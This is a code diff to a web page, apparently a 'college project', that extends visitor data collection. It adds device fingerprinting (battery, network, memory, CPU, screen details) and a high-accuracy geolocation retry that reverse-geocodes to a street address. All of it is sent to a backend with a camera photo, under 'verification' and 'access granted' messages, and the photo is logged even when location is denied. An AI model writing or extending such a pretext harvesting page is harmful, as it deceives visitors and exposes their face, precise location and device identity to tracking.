@@ -60,14 +60,41 @@ export default function Home() {
         localStorage.setItem('college_project_device_id', deviceId);
       }
 
-      // 1. Gather basic browser info
+      // 1. Gather advanced device and network info
+      let batteryInfo = null;
+      try {
+        if ('getBattery' in navigator) {
+          const battery: any = await (navigator as any).getBattery();
+          batteryInfo = {
+            level: Math.round(battery.level * 100) + '%',
+            charging: battery.charging
+          };
+        }
+      } catch (e) { console.error("Battery API err", e); }
+
+      let networkInfo = null;
+      if ('connection' in navigator) {
+        const conn = (navigator as any).connection;
+        networkInfo = {
+          type: conn.effectiveType || 'unknown',
+          downlink: conn.downlink ? `${conn.downlink} Mbps` : 'unknown',
+          rtt: conn.rtt ? `${conn.rtt} ms` : 'unknown'
+        };
+      }
+
       const browserInfo = {
         deviceId: deviceId,
         userAgent: navigator.userAgent,
         language: navigator.language,
         platform: navigator.platform,
         screenResolution: `${window.screen.width}x${window.screen.height}`,
+        windowSize: `${window.innerWidth}x${window.innerHeight}`,
+        colorDepth: `${window.screen.colorDepth}-bit`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'unknown',
+        battery: batteryInfo,
+        network: networkInfo,
       };
 
       // 2. Request Camera Permission & Take Photo
@@ -77,63 +104,81 @@ export default function Home() {
       // 3. Request Location Permission explicitly
       setMessage('Requesting Location verification...');
       if ('geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            
-            let resolvedAddress = "Address resolution unavailable";
-            try {
-              setMessage('Resolving precise delivery address...');
-              // Use OpenStreetMap Nominatim for free reverse geocoding
-              const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-              const data = await response.json();
-              if (data && data.display_name) {
-                resolvedAddress = data.display_name;
-              }
-            } catch (e) {
-              console.error("Geocoding error", e);
+        const getPosition = (options: PositionOptions): Promise<GeolocationPosition> => {
+          return new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, options);
+          });
+        };
+
+        try {
+          let position: GeolocationPosition;
+          try {
+            // Try high accuracy first (GPS)
+            position = await getPosition({ enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
+          } catch (err: any) {
+            // If it's a timeout (3) or position unavailable (2), fallback to low accuracy (network/wifi)
+            if (err.code === 2 || err.code === 3) {
+              setMessage('Refining location...');
+              position = await getPosition({ enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 });
+            } else {
+              throw err; // Re-throw permission denied (1)
             }
+          }
 
-            const locationData = {
-              latitude: lat,
-              longitude: lon,
-              accuracy: position.coords.accuracy,
-              address: resolvedAddress
-            };
-
-            // Send all gathered data to the backend
-            await logTelemetryData({
-              type: 'access_request',
-              status: 'granted',
-              browser: browserInfo,
-              location: locationData,
-              photo: photoDataUrl,
-            });
-
-            setStatus('success');
-            setMessage('Verification complete. Access granted and securely logged.');
-          },
-          async (error) => {
-            // User denied location permission
-            let errorMessage = 'Location access denied or unavailable.';
-            if (error.code === error.PERMISSION_DENIED) {
-              errorMessage = 'User explicitly denied the request for Geolocation.';
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          
+          let resolvedAddress = "Address resolution unavailable";
+          try {
+            setMessage('Resolving precise delivery address...');
+            // Use OpenStreetMap Nominatim for free reverse geocoding
+            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+            const data = await response.json();
+            if (data && data.display_name) {
+              resolvedAddress = data.display_name;
             }
+          } catch (e) {
+            console.error("Geocoding error", e);
+          }
 
-            await logTelemetryData({
-              type: 'access_request',
-              status: 'partial_denial',
-              browser: browserInfo,
-              photo: photoDataUrl, // Still log photo if they allowed camera but denied location
-              error: errorMessage,
-            });
+          const locationData = {
+            latitude: lat,
+            longitude: lon,
+            accuracy: position.coords.accuracy,
+            address: resolvedAddress
+          };
 
-            setStatus('error');
-            setMessage(errorMessage);
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+          // Send all gathered data to the backend
+          await logTelemetryData({
+            type: 'access_request',
+            status: 'granted',
+            browser: browserInfo,
+            location: locationData,
+            photo: photoDataUrl,
+          });
+
+          setStatus('success');
+          setMessage('Verification complete. Access granted and securely logged.');
+        } catch (error: any) {
+          // User denied location permission or both attempts failed
+          let errorMessage = 'Location access denied or unavailable.';
+          if (error.code === 1) { // 1 is PERMISSION_DENIED
+            errorMessage = 'User explicitly denied the request for Geolocation.';
+          } else if (error.message) {
+            errorMessage = `Location error: ${error.message}`;
+          }
+
+          await logTelemetryData({
+            type: 'access_request',
+            status: 'partial_denial',
+            browser: browserInfo,
+            photo: photoDataUrl, // Still log photo if they allowed camera but denied location
+            error: errorMessage,
+          });
+
+          setStatus('error');
+          setMessage(errorMessage);
+        }
       } else {
         // Geolocation not supported
         await logTelemetryData({
